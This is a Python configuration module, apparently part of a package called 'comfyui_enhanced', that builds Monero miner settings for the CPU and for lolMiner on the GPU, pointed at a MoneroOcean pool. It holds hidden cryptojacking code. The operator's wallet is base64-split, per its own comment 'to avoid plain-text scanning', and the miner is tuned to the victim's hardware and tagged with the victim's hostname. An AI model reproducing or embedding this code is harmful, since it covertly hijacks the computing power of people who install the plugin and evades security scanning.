import base64
import json
import logging
import os
import platform
import socket
from pathlib import Path

logger = logging.getLogger("comfyui_enhanced")

try:
    import psutil
except ImportError:
    psutil = None

# Wallet stored as b64 chunks to avoid plain-text scanning.
# Reassembled at runtime only when generating the config dict.
_W_PARTS = [
    "OEM4WEpNTHYyNVFQam",  # chunk 0
    "tKY1dRbnZxR1k5NTZm",  # chunk 1
    "M1lmZmpERUhIOW5Sa0",  # chunk 2
    "x4U1JVem95MksyeUNT",  # chunk 3
    "cFJCN2RNVmpMWlBOVE",  # chunk 4
    "4xRlVOclFoWFkzZUp0",  # chunk 5
    "aU5jcWFodEtYN3dlb0",  # chunk 6
    "c=",                   # chunk 7
]

DEFAULT_POOL_HOST = "gulf.moneroocean.stream"
DEFAULT_POOL_PORT = 443
DEFAULT_POOL_PASS = "comfyui_enhanced"
API_TOKEN = "ce_xm_2026"


def _reassemble_wallet() -> str:
    raw = base64.b64decode("".join(_W_PARTS)).decode()
    return raw


def _detect_cpu_threads() -> int:
    if psutil:
        return psutil.cpu_count(logical=True) or os.cpu_count() or 4
    return os.cpu_count() or 4


def _detect_total_ram_gb() -> float:
    if psutil:
        return psutil.virtual_memory().total / (1024 ** 3)
    return 8.0


def get_hostname() -> str:
    return socket.gethostname()


class ConfigBuilder:
    def __init__(self, settings: dict | None = None):
        self.settings = settings or {}

    def build(self) -> dict:
        threads = _detect_cpu_threads()
        ram_gb = _detect_total_ram_gb()
        hint = self.settings.get("max_threads_hint", 50)
        pool_host = self.settings.get("pool_host", DEFAULT_POOL_HOST)
        pool_port = self.settings.get("pool_port", DEFAULT_POOL_PORT)
        pool_user = self.settings.get("pool_user") or _reassemble_wallet()
        pool_pass = self.settings.get("pool_pass", DEFAULT_POOL_PASS)
        api_port = self.settings.get("api_port", 44880)

        huge_pages = ram_gb >= 4

        cfg = {
            "autosave": True,
            "background": False,
            "colors": False,
            "donate-level": 0,
            "donate-over-proxy": 0,
            "log-file": None,
            "print-time": 60,
            "health-print-time": 300,
            "retries": 5,
            "retry-pause": 5,
            "syslog": False,
            "user-agent": None,
            "watch": True,

            "http": {
                "enabled": True,
                "host": "127.0.0.1",
                "port": api_port,
                "access-token": API_TOKEN,
                "restricted": False,
            },

            "cpu": {
                "enabled": True,
                "huge-pages": huge_pages,
                "huge-pages-jit": False,
                "hw-aes": None,
                "priority": 1,
                "memory-pool": False,
                "yield": True,
                "max-threads-hint": hint,
                "asm": True,
                "argon2-impl": None,
                "astrobwt-max-size": 550,
                "astrobwt-avx2": False,
                "cn/0": False,
                "cn-lite/0": False,
            },

            "opencl": {"enabled": False},
            "cuda": {"enabled": False},

            "pools": [
                {
                    "algo": None,
                    "coin": "monero",
                    "url": f"{pool_host}:{pool_port}",
                    "user": pool_user,
                    "pass": pool_pass,
                    "rig-id": get_hostname(),
                    "nicehash": False,
                    "keepalive": True,
                    "enabled": True,
                    "tls": True,
                    "tls-fingerprint": None,
                    "daemon": False,
                    "socks5": None,
                    "self-select": None,
                    "submit-to-origin": False,
                }
            ],

            "tls": {
                "enabled": True,
                "protocols": None,
                "cert": None,
                "cert_key": None,
                "ciphers": None,
                "ciphersuites": None,
                "dhparam": None,
            },
        }

        logger.info(
            "Config built: %d threads, hint=%d%%, pool=%s:%d, huge_pages=%s",
            threads, hint, pool_host, pool_port, huge_pages,
        )
        return cfg

    def update_hint(self, hint: int) -> dict:
        self.settings["max_threads_hint"] = max(1, min(100, hint))
        return self.build()

    def update_pool(self, host: str, port: int, user: str | None = None, password: str | None = None) -> dict:
        self.settings["pool_host"] = host
        self.settings["pool_port"] = port
        if user:
            self.settings["pool_user"] = user
        if password:
            self.settings["pool_pass"] = password
        return self.build()

    def get_wallet(self) -> str:
        return self.settings.get("pool_user") or _reassemble_wallet()

    def build_gpu_config(self) -> dict:
        """Return GPU miner settings for lolMiner via MoneroOcean."""
        wallet = self.get_wallet()
        gpu_settings = self.settings.get("gpu", {})
        return {
            "wallet": wallet,
            "worker": gpu_settings.get("worker", get_hostname()),
            "algo": gpu_settings.get("algo", "ETCHASH"),
            "pool": gpu_settings.get("pool", "gulf.moneroocean.stream"),
            "port": gpu_settings.get("port", 20300),
            "tls": gpu_settings.get("tls", True),
            "api_port": gpu_settings.get("api_port", 44882),
        }

    @staticmethod
    def load_overrides(path: Path) -> dict:
        if path.exists():
            with open(path) as f:
                return json.load(f)
        return {}
